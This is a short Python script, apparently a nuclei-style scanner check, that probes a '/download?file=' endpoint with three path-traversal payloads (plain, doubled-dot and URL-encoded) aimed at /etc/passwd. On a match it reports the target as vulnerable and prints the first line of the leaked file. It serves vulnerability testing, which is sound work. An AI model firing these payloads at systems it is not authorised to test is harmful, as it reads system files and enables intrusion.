import sys
import urllib.request
import re

def check(url: str) -> dict:
    payloads = [
        "/download?file=../../etc/passwd",
        "/download?file=....//....//etc/passwd",
        "/download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ]

    for payload in payloads:
        target = url.rstrip("/") + payload
        try:
            req = urllib.request.Request(target, headers={"User-Agent": "nuclei"})
            with urllib.request.urlopen(req, timeout=5) as resp:
                body = resp.read().decode("utf-8", errors="ignore")
                if re.search(r"root:[x*]:0:0:", body):
                    return {
                        "matched": True,
                        "matched-at": target,
                        "extracted-results": [body.splitlines()[0]],
                    }
        except Exception:
            continue

    return {"matched": False}


if __name__ == "__main__":
    target_url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
    result = check(target_url)
    if result["matched"]:
        print(f"[VULNERABLE] {result['matched-at']}")
        print(f"[EXTRACTED]  {result['extracted-results']}")
    else:
        print("[NOT VULNERABLE] No path traversal detected")
